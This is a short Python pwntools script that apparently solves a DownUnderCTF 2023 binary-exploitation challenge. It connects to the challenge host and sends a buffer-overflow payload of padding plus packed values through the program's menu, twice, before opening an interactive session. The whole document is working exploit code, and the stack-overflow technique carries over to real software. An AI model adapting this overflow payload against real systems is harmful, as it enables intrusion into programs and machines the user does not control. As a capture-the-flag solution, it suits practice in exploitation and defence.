#!/usr/bin/env python3
from pwn import *


elf = ELF('/home/kali/Desktop/DUCTF/pwn2/sc')
rop = ROP(elf)
context.arch = elf.arch

# p = process('/home/kali/Desktop/DUCTF/pwn2/sc')
# gdb.attach(p, gdbscript='b *calculate+66')
p = remote('2023.ductf.dev', 30015)

payload = ('A' * 36 + p32(0x3c2c3937).decode() + 'B' * 4 + p32(0x7d602641).decode()).encode()

print(p.recv().decode(errors='ignore'))
p.sendline(b'2')
print(p.recv().decode(errors='ignore'))
p.sendline(payload)
print(p.recv().decode(errors='ignore'))
p.sendline(b'1')

payload = ('A' * 36 + p32(0x3c2c3937).decode() + 'B' * 4).encode()

print(p.recv().decode(errors='ignore'))
p.sendline(b'2')
print(p.recv().decode(errors='ignore'))
p.sendline(payload)
print(p.recv().decode(errors='ignore'))
p.sendline(b'1')

p.interactive()
